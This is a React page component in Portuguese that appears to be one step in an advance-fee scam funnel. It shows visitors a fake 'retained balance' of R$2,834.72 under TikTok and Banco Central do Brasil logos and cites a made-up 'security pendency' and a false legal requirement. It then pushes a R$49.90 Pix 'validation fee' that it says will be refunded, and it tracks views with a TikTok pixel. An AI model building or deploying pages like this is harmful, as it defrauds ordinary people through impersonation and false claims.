import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import PixPaymentPopup from '@/components/PixPaymentPopup';
import PageTransition from '@/components/PageTransition';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_TVS = 49.90;
const TAXA_TVS_CENTAVOS = 4990;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up3 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Taxa de Validação TVS', TAXA_TVS);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up4');
  };

  return (
    <PageTransition>
      <main className="upsell-page upsell-page-with-footer">
        {/* Header */}
        <div className="upsell-header">
          <img src="/images/tiktok-logo.png" alt="TikTok" className="upsell-logo" />
        </div>

        {/* Saldo Retido Card */}
        <div className="upsell-card upsell-card-center">
          <p className="saldo-label-small">SALDO RETIDO</p>
          <h1 className="saldo-big">R$ {formatBR(SALDO_FINAL)}</h1>
          <div className="status-badge status-warning">
            ⚠ Pendência de Segurança nº 9082-BC
          </div>
        </div>

        {/* Motivo do Bloqueio */}
        <div className="upsell-card">
          <div className="alert-box alert-warning">
            <p className="alert-title">⚠ MOTIVO DO BLOQUEIO:</p>
            <p className="alert-text">
              O sistema anti-fraude do Banco Central identificou uma movimentação atípica. Conforme a Lei 14.220, transferências acima de 2k exigem Validação Biométrica Financeira.
            </p>
          </div>

          <p className="section-label">RESUMO</p>

          <div className="summary-row summary-row-border">
            <span className="summary-label">Status</span>
            <span className="summary-value summary-value-orange">Pausado</span>
          </div>

          <div className="summary-row summary-row-bg">
            <span className="summary-label-bold">Taxa de Validação (TVS)</span>
            <span className="summary-value-big">R$ {formatBR(TAXA_TVS)}</span>
          </div>

          <div className="success-box">
            <span className="success-icon">✓</span>
            <p className="success-text">
              O valor da taxa serve apenas para confirmar titularidade e será devolvido junto com o saque.
            </p>
          </div>

          <div className="logo-row">
            <img src="/images/bacen.png" alt="Banco Central do Brasil" className="partner-logo" />
          </div>
        </div>

        {/* Fixed Bottom Button */}
        <div className="fixed-footer">
          <button
            onClick={() => setShowPixPopup(true)}
            className="cta-button cta-success"
          >
            PAGAR R$ {formatBR(TAXA_TVS)} E LIBERAR SALDO
          </button>
          <p className="cta-success-note">Reembolso Automático</p>
        </div>

        {showPixPopup && (
          <PixPaymentPopup
            amount={TAXA_TVS_CENTAVOS}
            description="Taxa de Validação TVS"
            onSuccess={handlePaymentSuccess}
            onClose={() => setShowPixPopup(false)}
          />
        )}
      </main>
    </PageTransition>
  );
};

export default Up3;
